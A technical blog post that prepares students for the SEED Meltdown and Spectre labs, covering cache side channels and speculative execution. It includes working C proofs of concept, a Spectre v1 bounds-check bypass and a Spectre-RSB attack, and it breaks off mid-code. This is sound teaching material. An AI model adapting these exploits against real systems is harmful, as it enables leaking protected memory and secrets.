---
layout:             post
title:              "SEED Labs 2.0: System Security Labs Preview"
category:           "Hardware Security"
tags:               hardware-security microarchitecture cache
permalink:          /posts/seedlabs/system-security
last_modified_at:   "2022-12-14"
---

**This post guides through some background knowledge required in the [SEED Meltdown and Spectre Attack Labs](https://seedsecuritylabs.org/Labs_20.04/System/)**.

The security of userspace applications and the operating system kernel is essentially dependent upon memory protection. Security patches have been applied to prevent address information leakage. But address information can still be exploited *on the microarchitectural level* even if the operating system does its job.

In 2017, it was discovered that many modern processors are vulnerable to attacks called **Meltdown**{: style="color: red"} (CVE-2017-5754) and **Spectre**{: style="color: red"} (CVE-2017-5753 and CVE-2017-5715). Meltdown allows a user-level program to read data stored inside the kernel memory, which causes a trap. But before the trap is issued, the instructions that follow the access leak the contents of the accessed memory through a cache covert channel. Meltdown vulnerability affects Intel x86 microprocessors and some ARM-based microprocessors. Spectre exploits a race condition vulnerability in the design of the speculative execution implemented in *most* CPUs, which allows a malicious program to read the data from the area that is not accessible to it. Unlike the Meltdown attack, the restricted area does not need to be inside the kernel; it can be in the same process space as the malicious program, making defending the Spectre attack much more difficult.

<!-- excerpt-end -->

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## An Introduction to Cache Attacks

**Cache attacks are side channel attacks exploiting timing differences introduced by CPU caches.**

Assume that a **set-associative memory cache**{: style="color: red"} on modern processors is organized into $S$ *cache sets*, each of which contains $W$ *cache lines*. In common terminology, $W$ is called the *associativity* and the corresponding cache is called $W$-*way associative*. A cache line is a storage cell consisting of, let's say, $B$ bytes. Thus, a cache has $S \cdot W \cdot B$ bytes in size.

"Higher-level" caches, which are closer to the processor core, are smaller but faster than "lower-level" caches, which are closer to main memory. The last-level cache (LLC) is a *unified* cache (storing both data and instruction), typically shared among all cores of a multicore chip. An important feature of the LLC in modern Intel processors is its *inclusivity*, i.e. the LLC contains copies of all of the data stored in the higher cache levels. The $\log_{2}B$ lowest-order bits of the memory address (the *line offset*) are used to locate a datum in the cache line. The $\log_{2}S$ consecutive bits starting from bit $\log_{2}B$ of the memory address (the *set index*) is used to locate a cache set when the cache is accessed. The remaining high-order bits are used as a *tag* for each cache line. After locating the cache set, the tag field of the address is matched against the tag of the $W$ lines in the set to identify if one of the cache lines is a cache hit.

[The 2005 paper by Colin Percival](https://www.daemonology.net/papers/htt.pdf) investigated the cryptographic side-channel created by cache memory sharing (on the 2.8 GHz Intel Pentium 4 processor)[^1]. The instruction <code>prefetcht2</code> tells the processor to prefetch data from memory into L2 cache and higher.

```assembly
    mov         ecx, start_of_buffer
    sub         length_of_buffer, 0x2000    ; Spy's 8192-byte buffer
    rdtsc
    mov         esi, eax
    xor         edi, edi                    ; %edi <- 0
loop:
    prefetcht2  [ecx + edi + 0x2800]        ; buffer[64i + 10240]
    add         cx, [ecx + edi + 0x0000]    ; %cx <- buffer[64i]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x0800]    ; %cx <- buffer[64i + 2048]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x1000]    ; %cx <- buffer[64i + 4096]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x1800]    ; %cx <- buffer[64i + 6144]
    imul        ecx, 1

    rdtsc
    sub         eax, esi
    mov         [ecx + edi], ax
    add         esi, eax
    imul        ecx, 1

    add         edi, 0x40                   ; %edi <- %edi + 64
    test        edi, 0x7c0                  ; Jump to loop if %edi not
    jnz         loop                        ; equal to 1984 = 31 * 64

    sub         edi, 0x7fe                  ; %edi <- %edi - 2046
    test        edi, 0x3e                   ; Jump to loop if %edi not
    jnz         loop                        ; equal to 62

    add         edi, 0x7c0                  ; %edi <- %edi + 1984
    sub         length_of_buffer, 0x800     ; Trojan's 2048-byte buffer
    jge         loop
```

The above code illustrates how a Spy process can monitor the L1 data cache ($128$ cache lines of $64$ bytes each, organized into $32$ four-way associative sets): it repeatedly measures the amount of time needed to read bytes <code>64i</code>, <code>64i + 2048</code>, <code>64i + 4096</code>, and <code>64i + 6144</code> of a $8192$-byte array for <code>i = 0..31</code>. A Trojan process accesses byte <code>64i</code> of an $2048$-byte array if and only if bit <code>i</code> of a $32$-bit word is set. One memory access by the Trojan process causes four cache misses by the Spy.

### Comparing Data Access Time of CPU Cache with Main Memory

In the following code (<code>CacheTime.c</code>), we have an array of size <code>10 * 4096</code> with elements at the multiples of $$4096$$ initialized to ones. Since a typical cache block size is 64 bytes, no two elements used in the program fall into the same cache block.

```c
/* CacheTime.c */
#include <x86intrin.h>
#include <stdio.h>

#define N 10

uint8_t array[N * 4096];

int main(int argc, const char **argv)
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    for (i = 0; i < N; i++) {
        array[i * 4096] = 1;
    }

    for (i = 0; i < N; i++) {
        _mm_clflush(&array[i * 4096]);
    }

    array[3 * 4096] = 100;
    array[7 * 4096] = 200;

    for (i = 0; i < N; i++) {
        addr = &array[i * 4096];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        printf("Access time for array[%d * 4096]: %5u CPU cycles.\n", i, (unsigned int)time2);
    }

    return 0;
}
```

[<code>x86intrin.h</code>](https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/host/x86_64-linux-glibc2.7-4.6/+/refs/heads/jb-dev/lib/gcc/x86_64-linux/4.6.x-google/include/x86intrin.h) is the main header file for all x86 intrinsics functions.

The prototypes for [Intel Streaming SIMD Extensions 2 (Intel SSE2) intrinsics](https://www.intel.com/content/www/us/en/docs/intrinsics-guide/) for cacheability support are in the <code>emmintrin.h</code> header file, where the function <code>_mm_clflush()</code> is defined as:
```c
#include <emmintrin.h>

/* Cache line containing p is flushed and invalidated
 * from all caches in the coherency domain. */
void _mm_clflush (void const* p);
```
The data size affected is the cache coherency size, which is enumerated by the CPUID instruction (typically 64 bytes).

The function <code>__rdtscp()</code> is defined as:
```c
#include <immintrin.h>

/* dst[63:0] := TimeStampCounter
 * MEM[mem_addr+31:mem_addr] := IA32_TSC_AUX[32:0] */
unsigned __int64 __rdtscp (unsigned int * mem_addr);
```

Compile <code>CacheTime.c</code> using the following command:
```bash
gcc -march=native CacheTime.c -o CacheTime
```

On my Mac PC (1.6 GHz Dual-Core Intel Core i5 with macOS Monterey 12.6.1 installed):
```console
$ sysctl -a | grep machdep
...
machdep.cpu.cache.linesize: 64
machdep.cpu.cache.L2_associativity: 8
machdep.cpu.cache.size: 256
...
machdep.cpu.brand_string: Intel(R) Core(TM) i5-5250U CPU @ 1.60GHz
$ sysctl -a | grep cache
...
hw.l1icachesize: 32768
hw.l1dcachesize: 32768
hw.l2cachesize: 262144
hw.l3cachesize: 3145728
...
```
running the program produces the following results:
```console
$ ./CacheTime
Access time for array[0 * 4096]:   134 CPU cycles.
Access time for array[1 * 4096]:   134 CPU cycles.
Access time for array[2 * 4096]:   182 CPU cycles.
Access time for array[3 * 4096]:    50 CPU cycles.
Access time for array[4 * 4096]:   138 CPU cycles.
Access time for array[5 * 4096]:   150 CPU cycles.
Access time for array[6 * 4096]:   140 CPU cycles.
Access time for array[7 * 4096]:    68 CPU cycles.
Access time for array[8 * 4096]:   142 CPU cycles.
Access time for array[9 * 4096]:   142 CPU cycles.
```

We can see that the accesses of <code>array[3 * 4096]</code> and <code>array[7 * 4096]</code> are consistenty faster than the accesses of other elements because these two elements are already in the cache while the others are not.

### Attacks on AES: Exploiting Memory Access Patterns

Side channel attacks consist of three phases: the **priming phase** which is used to place a system into a desired initial state (e.g. flushing cache lines), the **triggering phase** which is used to perform the action that conveys information through the side channel, and the **observing phase**, which is used to detect the presence of the information conveyed through the side channel. These phases can occur architecturally (by actually executing instructions), or speculatively (through speculative execution)[^2].

[RSA](https://cs.ru.nl/~joan/papers/JDA_VRI_Rijndael_2002.pdf) is a public-key cryptosystem which supports both encryption and digital signatures. To generate an RSA key pair $(N, e)$, the user randomly generates two prime numbers $p$, $q$, and computes $N = pq$. Next, given a public exponnet $e$ (e.g. $65537$ used by GnuPG and OpenSSL), the user computes the secret exponent

$$d \equiv e^{-1} \pmod{(p - 1)(q - 1)}.$$

The private key is the triple $(p, q, d)$. In textbook RSA encryption, a message $m$ is encrypted by computing $m^{e} \pmod{N}$ and a ciphertext $c$ is decrypted by computing $c^{d} \pmod{N}$ (these are so-called "*modular exponentiation*" calculations). RSA decryption is often implemented using the Chinese remainder theorem (CRT), which splits the secret key $d$ into two parts:

$$d_{p} = d \pmod{(p - 1)},$$

and

$$d_{q} = d \pmod{(q - 1)},$$

and then computes two parts of the message as $m_{p} = c^{d_{p}} \pmod{p}$ and $m_{q} = c^{d_{q}} \pmod{q}$. Then the message $m$ is calculated by

$$h = (m_{p} - m_{q})(q^{-1} \pmod{p}) \pmod{p},$$

and

$$m = m_{q} + hq.$$

AES software relies heavily upon **S-box lookups**, which are table lookups using input-dependent indices; i.e., loads from input-dependent addresses in memory. As an example, Barreto's 2003 implementation scrambles a $16$-byte input $n$ using a $16$-byte key $k$, a constant $256$-byte table $S = (99, 124, 119, 123, 242, ...)$, and another constant $256$-byte table $S' = (198, 248, 238, 246, 255, ...)$. These two $256$-byte tables are expanded into four $1024$-byte ($256$ times $4$-byte words) tables $T_{0}, T_{1}, T_{2}, T_{3}$:

$$
\begin{align}
T_{0}[b] &= (S'[b], S[b], S[b], S[b] \oplus S'[b]) \\
T_{1}[b] &= (S[b] \oplus S'[b], S'[b], S[b], S[b]) \\
T_{2}[b] &= (S[b], S[b] \oplus S'[b], S'[b], S[b]) \\
T_{3}[b] &= (S[b], S[b], S[b] \oplus S'[b], S'[b]).    
\end{align}
$$

where $\oplus$ means "exclusive-or". What is the consequence? Consider calculating $T_{0}[k[0] \oplus n[0]]$ near the beginning of the AES computation. It is reasonable to speculate that the time for this lookup depends on the array index and the AES timing might leak information about $k[0] \oplus n[0]$. How to exploit this? A simple idea is to watch the time taken by a victim program, total the AES times for each possible $n[13]$, and track the value of $n[13]$ when the overall AES time reaches maximum (e.g. $n[13] = 147$). If we already know that when $k[13] \oplus n[13] = 8$ the overall AES time reaches maximum, we can directly compute $k[13] = 147 \oplus 8 = 155$[^3].

[Gullasch et al. (2011)](https://ieeexplore.ieee.org/document/5958048) shows the timing measurement procedure from which we can infer whether an accessed table entry had already been in the cache before[^4]:

```c
#define CACHE_LINE_SIZE 64
#define CACHE_HIT_THRESHOLD 200                     /* found by authors' empirical testing */

unsigned int measureFlush(const uint8_t *table, size_t table_size, uint8_t *bitmap)
{
    size_t i;
    uint64_t time1, time2;
    unsigned int n_hits = 0;

    for (i = 0; i < table_size/CACHE_LINE_SIZE; i++) {
        __asm__ (
                "xor        %%eax,%%eax     \n"     /* set %eax to zero */
                "cpuid                      \n"     /* serialization */
                "rdtsc                      \n"     /* store a 64-bit timestamp into %edx:%eax */
                "mov        %%eax,%%edi     \n"     /* preserve the lower bits in %edi */
                "mov        (%%esi),%%ebx   \n"     /* store the data at %esi to %ebx */
                "xor        %%eax,%%eax     \n"
                "cpuid                      \n"
                "rdtsc                      \n"
                "clflush    (%%esi)         \n"     /* flush accessed data */
            : /* output operands */
                "=a"(time2), "=D"(time1)            /* time2 <- %eax, time1 <- %edi */
            : /* input operands */
                "S"(table + CACHE_LINE_SIZE * i)    /* a table position */
            : /* clobber description */
                "ebx", "ecx", "edx", "cc"
        );

        if (time2 - time1 < CACHE_HIT_THRESHOLD) {
            n_hits++;
            bitmap[i/8] |= 1 << (i%8);              /* cache hit */
        } else {
            bitmap[i/8] &= ~(1 << (i%8));           /* cache miss */
        }
    }

    return n_hits;
}
```

A timing method called **Evict+Time** assumes that we know the memory address of each (lookup) table $T_{\ell}$ (denoted as $V(T_{\ell})$) and the cache sets of all tables are distinct, and proceeds as follows:
- Trigger an encryption of plaintext $\mathbf{p}$;
- Access some $W$ (cache associativity) memory addresses, at least $B$ (cache line size) bytes apart, that are all congruent to $V(T_{\ell}) + y \cdot B / \delta \pmod{S \cdot B}$ (where $y$ is the table index and $\delta$ is $B$ divided by the size of each table entry);
- Trigger a second encryption of $\mathbf{p}$ and time it as the measurement score.

This method is not sound if we are extracting AES keys from "heavy-weight" services because triggering the encryption (e.g., through a kernel system call) typically executes additional code and the timing can be influenced by instruction scheduling, conditional branches, page table misses, etc.

Another timing method called **Prime+Probe** tries to discover the set of memory blocks read by the encryption *a posteriori*, by examining the state of the cache after encryption. Assume the tables $T_{0}, T_{1}, T_{2}. T_{3}$ are contiguous. The attacker will first allocate a contiguous byte array $A[0, \dots , S \cdot W \cdot B - 1]$ starting from a known address congruent modulo $S \cdot B$ to the start address of $T_{0}$. Then, the method proceeds as follows:
- Read a value from every memory block in $A$;
- Trigger an encryption of $\mathbf{p}$;
- For every table $\ell = 0, \dots , 3$, and index $y = 0, \delta, 2\delta, \dots , 256 - \delta$, read memory addresses $A[1024\ell + 4y + tSB]$ for $t = 0, \dots , W - 1$ and time these $W$ memory accesses.

Each encryption effectively yields $4 \cdot 256 / \delta$ samples of measure score[^5]. With page sharing between the Spy process and the Trojan process, the Spy can make sure that a specific memory line is evicted from the whole cache hierarchy. Nevertheless, the Prime+Probe side channel attack has some limitations:
- First, it can only be applied in small caches (typically the L1 cache), since only a few bits of the virtual memory address are known. (More recently, [Liu et al. (2015)](https://ieeexplore.ieee.org/document/7163050)[^6] implements a Prime+Probe attack targeting the LLC.)
- Second, the employment of such a Spy process in small caches restricts its application to processes co-located on the same core.
- Finally, modern processors have very similar access times for L1 and L2 caches, only differing in a few cycles, which makes the detection method noisy and challenging[^7].

The **Flush+Reload** method proposed by [Yarom and Falkner (2014)](https://www.usenix.org/node/184416)[^8] targets the LLC with the Spy process being independent of memory accesses of the Trojan process. The method first allocates an <code>array</code> with $256 \times 4096$ elements (no two elements <code>array[i * 4096]</code> and <code>array[j * 4096]</code> will be in the same cache block) and proceeds as follows:
- Flush the array to make sure none of the $256$ elements (<code>array[k * 4096 + DELTA]</code> for <code>k = 0..255</code>) is cached;
- Access the array element at position $S$ where $S$ is a one-byte secret value we happen to know;
- Access $256$ elements of the array. The access time for the element at position $S$ should be faster than that for the other elements.

```c
/* FlushReload.c */
#include <x86intrin.h>
#include <stdio.h>

uint8_t array[256 * 4096];
char secret = 94;                   /* Secret value */
int temp;                           /* Stores the value of the array element at the secret position */

#define CACHE_HIT_THRESHOLD (80)    /* May vary based on CPU and memory speed */
#define DELTA 1024

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void getSecret()
{
    temp = array[secret * 4096 + DELTA];
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

int main(int argc, const char **argv)
{
    flushSideChannel();
    getSecret();
    reloadSideChannel();
    return 0;
}
```

Compile the program and run it multiple times:
```console
$ gcc -march=native FlushReload.c -o FlushReload
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
```
Note that in the second program run, no secret value was identified. This is the noisy nature of side channels.

### Observing Out-of-Order Execution and Branch Prediction by CPUs

Both Intel and AMD use micro-ops (or "*&mu;*ops"), which can be seen as a simplified RISC machine that runs inside the CPU. All instructions from the x86 ISA are then dynamically decoded into their corresponding *&mu;*ops, and are then executed on much simpler execution units. This instruction splitting makes it possible to *reorder* the execution of *&mu;*ops to achieve performance gains. x86 architecture maintains a FIFO buffer of *&mu;*ops in their original order while executing them *out of order*, called **reorder buffer (ROB)**{: style="color: red"}.

A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the processor can discard the resulting state without architectural effects and continue execution on the correct execution path[^9]. This feature, orthogonal to out-of-order execution, is called *speculative execution*.

In Section 11.7 of [Intel's Software Developer's Manual: Vol. 3A](https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html), *implicit caching*, which occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling, is defined as the situation "when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence."

Reusing some code from the previous section, let us conduct an experiment in which our <code>victim()</code> function only accesses the array element at the secret position if some <code>x</code> is less than $10$. To take advantage of CPU's speculative execution feature, we train the CPU to expect the <code>if</code> condition to come out to be true.
```c
/* An experiment to observe the effect caused by an out-of-order execution */
#include <x86intrin.h>
#include <stdio.h>

int size = 10;
uint8_t array[256 * 4096];
uint8_t temp = 0;

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void victim(size_t x)
{
    if (x < size) {
        temp = array[x * 4096 + DELTA];
    }
}

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

int main()
{
    int i;
    /* The training procedure */
    for (i = 0; i < 10; i++) {
        _mm_clflush(&size);
        victim(i);
    }

    /* Flush the probing array */
    flushSideChannel();

    /* Access the secret */
    _mm_clflush(&size);
    victim(97);

    /* Reload the probing array */
    reloadSideChannel();

    return 0;
}
```

Compile the program and run it multiple times:
```console
$ gcc -march=native specexec.c -o specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
```
We can see that although $97 > 10$, the secret element still appears in the cache, which is due to the out-of-order execution and the branch prediction at the microarchitectural level. However, if we call <code>victim(i + 11)</code> rather than <code>victim(i)</code> (so that <code>i + 11</code> always greater than <code>size</code> for <code>i = 0..9</code>) during the training procedure, the output becomes:
```console
$ gcc -march=native specexec.c -o specexec
$ ./specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
$ ./specexec
$ ./specexec
$ ./specexec
$ ./specexec
```

## The Meltdown Attack

If a *&mu;*op is in the ROB, there are four cases:
- it is waiting for its dependencies to be resolved;
- it is ready to be executed;
- it is already being executed; or
- it is done executing but was not yet retired.

Retiring a *&mu;*op means to reflect its changes back to the architectural state. The ROB retires instructions in order such that the architectural state is updated sequentially. Meltdown uses the fact that out-of-order engines do not handle exceptions until the retirement stage, and leverages it to access memory regions that would otherwise trigger a fault (e.g., kernel memory).

## The Spectre Attack

On modern processors, the (per-core) **Branch Prediction Unit (BPU)**{: style="color: red"}, or branch predictor, is composed of two structures: the **directional predictor**{: style="color: red"} and the **branch target buffer (BTB)**{: style="color: red"}.

Typically, the directional predictor takes advantage of the **Pattern History Table (PHT)**{: style="color: red"} for direction prediction (i.e. speculative decision about whether a conditional branch is taken or not). The BPU can operate in different modes: 
- In the one-level prediction mode, the branch address is the only information source to index the PHT entry. 
- In the history-based (two-level) prediction mode, a branch history buffer maintains the history of prior branch executions.<br>

Modern processors generally choose a hybrid design that uses the one-level prediction to select PHT entry with a predetermined number of bits from the branch address and uses the history-based prediction to index into PHT with the branch address hashed by a **global history register (GHR)**{: style="color: red"}. The GHR is a shift register that keeps track of the most recent history among all branches executed on the core.

The BTB is a simple direct-mapped cache of addresses that stores the last target address of a branch that maps to each of its entry. If a certain branch is predicted to be taken, the target address of the branch is obtained from BTB.

### Textbook Version: Training the BPU to Bypass Bound Checking

Consider the case of an attacker trying to steal data from the *same* process using traces of the out-of-order execution left behind by the CPU.

In the following program, assume the attacker already knows the address of the secret. The training procedure done in the <code>spectreAttack()</code> function is also called *branch direction mistraining* by some of the security researchers.
```c
/* SpectreAttack.c */
/* Spectre Variant 1 (CVE-2017-5753): Bounds Check Bypass */
#include <x86intrin.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t array[256 * 4096];
uint8_t temp = 0;
char *secret = "St. Louis County recorded a total of 4,159 violent crimes in 2021!";

/* Sandbox Function */
uint8_t restrictedAccess(size_t x)
{
    if (x < buffer_size) {
        return buffer[x];
    } else {
        return 0;
    }
}

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

void spectreAttack(size_t larger_x)
{
    int i;
    uint8_t s;

    /* Train the CPU to take the true branch inside sandbox function */
    for (i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    /* Flush buffer_size and array[] from the cache */
    _mm_clflush(&buffer_size);      /* Required for the attack to take effect */
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }
    for (i = 0; i < 100; i++) { }

    s = restrictedAccess(larger_x); /* Only zero should be returned */
    array[s * 4096 + DELTA] += 88;  /* However the cache is not cleaned */
}

int main()
{
    flushSideChannel();

    size_t larger_x = (size_t)(secret - (char *)buffer);    /* Offset of the secret from the beginning of the buffer */
    spectreAttack(larger_x);
    
    reloadSideChannel();

    return 0;
}
```

Since we are racing against the execution unit that is comparing our input to the buffer size, we flush the <code>buffer_size</code> variable from the cache so that the comparation takes longer. Compile the program and run it multiple times:
```console
$ gcc -march=native SpectreAttack.c -o SpectreAttack
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
array[83 * 4096 + 1024] is in cache!
The secret is 83.
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
array[83 * 4096 + 1024] is in cache!
The secret is 83.
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
array[83 * 4096 + 1024] is in cache!
The secret is 83.
```

It is shown that the element <code>array[0 * 4096 + 1024]</code> is always in the cache because we bring it into the cache and modify its value inside our attack function. Another secret, $83$, which is the ASCII value of letter <code>S</code>, the first letter of our secret string, gets printed out because of CPU's speculative execution and the ability of out-of-bound array access in C. Then, I commented out the idle loop after flushing and obtained the following results on my mac:
```console
$ gcc -march=native SpectreAttack.c -o SpectreAttack
$ ./SpectreAttack
$ ./SpectreAttack
$ ./SpectreAttack
array[0 * 4096 + 1024] is in cache!
The secret is 0.
$ ./SpectreAttack
array[83 * 4096 + 1024] is in cache!
The secret is 83.
$ ./SpectreAttack
array[83 * 4096 + 1024] is in cache!
The secret is 83.
$ ./SpectreAttack
array[83 * 4096 + 1024] is in cache!
The secret is 83.
```
In most cases, the secret <code>0</code> was not printed, probably because in those cases the element was brought into the cache before our cache flushing took place.

### BTB Poisoning

A branch must be unresolved for a number of cycles to allow *transient* instructions from the wrong execution path to access sensitive data and leave traceable instances by initializing cache accesses. The number of instructions executed before the branch is resolved is known as the width of speculative window. There are two distinct scenarios that create dangerous speculative window:
1. When the data that determines conditional branch direction is not located in CPU caches, and the BPU mispredicts its direction (this is what we saw in the previous section);
2. When the target of an **indirect branch** is not in CPU cache while BTB contains an incorrect target due to a collision with another branch[^10].

Indirect branches are a basic type of processor instruction which enable programs to dynamically change what code is executed by the processor at runtime. To execute an indirect branch, the processor computes a *branch target*, which determines what instruction to execute after the indirect branch. However, the processor cannot fetch the next instruction until the branch target is computed, resulting in pipeline stalls that significantly degrade performance. To eliminate these stalls, processors execute speculatively with the help of BTB[^11]. Since the BTB is shared among multiple processes running on the same core, information leakage from one process to another through BTB side channel is possible. To create a BTB-based side channel, three conditions must be satisfied:
- First, the Trojan process has to fill a BTB entry by executing a branch instruction;
- Second, the execution time of the Spy process running on the same core must be affected by the state of the BTB, which is possible when two processes are using the same BTB entry;
- Third, the Spy process must be able to detect the impact on its execution by performing time measurements[^12].

### Spectre-RSB

Call and return instructions are always executed in pairs. Dedicated to a logical core in case of hyperthreading, the **Return Stack Buffer (RSB)**{: style="color: red"} is a fixed-size buffer that provides predictions for <code>ret</code> instructions. When the CPU executes a call instruction, a new entry (the address of the next instruction) is added to the RSB and the top pointer is incremented; when the CPU executes a return instruction, the value is taken from the RSB, the top pointer is decremented, and the read value is used for return address prediction. Consider a RSB that can hold $16$ entries. It must drop the oldest entries if a call chain goes deeper than that. As this deep call chain returns, it has actually executed more <code>ret</code> instructions than the number of entries in the RSB and the RSB has underflowed[^13].

Here is a simple proof-of-concept (PoC) implementation of [Koruyeh et al. (2018)](https://dl.acm.org/doi/10.5555/3307423.3307426)[^14]:
```c
/* spectre-rsb.c */
#include <stdio.h>
#ifdef _MSC_VER
#include <intrin.h>         /* For rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h>      /* For rdtscp and clflush */
#endif

uint8_t array[256 * 512];
uint8_t hit[8];
uint8_t temp = 0;

char *secret = "On the bonnie, bonnie banks of Loch Lomond.";

void flushSideChannel()
{
    int i;

    for (i = 0; i < 256; i++) {
        array[i * 512] = 1;
    }

    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 512]);
    }
}

/* Serves two purposes: (1) the return address is pushed to the RSB
 * and (2) create a mismatch between the RSB and the software stack. */
void spectreGadget()
{
    asm volatile(
        "push       %rbp        \n"
        "mov        %rsp,%rbp   \n"
        "pop        %rdi        \n"     /* removes frame/return address */
        "pop        %rdi        \n"     /* from stack stopping at */
        "pop        %rdi        \n"     /* next return address*/
        "nop                    \n"
        "mov        %rbp,%rsp   \n"
        "pop        %rbp        \n"
        "clflush    (%rsp)      \n"     /* flushing creates a large speculative window */
        "leaveq                 \n"
        "retq                   \n"     /* triggers speculative return to s = *ptr */
    );
}

void spectreAttack(char *ptr)
{
    uint8_t s;

    flushSideChannel();
    _mm_mfence();
    
    /* modifies the software stack */
    spectreGadget();
    /* reads the secret */
    s = *ptr;
    /* communicates the secret out */
    temp &= array[s * 512];
}

void readMemoryByte(char *ptr, uint8_t value[2], int score[2], uint64_t cache_hit_threshold) {
    static int results[256];
    int attempts, i, j, k, mix_i;
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }

    for (attempts = 999; attempts > 0; attempts--) {
        spectreAttack(ptr);
        /* real return value is obtained and the misspeculation is squashed */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= cache_hit_threshold) {
                results[mix_i]++;
            }
        }

        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
            break;
        }
        results[0] ^= junk;
        value[0] = (uint8_t)j;
        score[0] = results[j];
        value[1] = (uint8_t)k;
        score[1] = results[k];
    }
}

int main()
{
    int i, score[2], len = 43;
    uint8_t value[2];
    unsigned int junk = 0;
    register uint64_t time1, time2 = 0, time3;
    volatile uint8_t *addr;
    for (i = 0; i < 1000; i++) {
        hit[0] = 0x5A;
        addr = &hit[0];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 += __rdtscp(&junk) - time1;
    }
    time3 = time2 / 1000;
    printf("CACHE_HIT_THRESHOLD is calculated as %llu\n", time3);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at secret = %p... ", (void *)secret);
        readMemoryByte(secret++, value, score, time3);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%-4d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) {
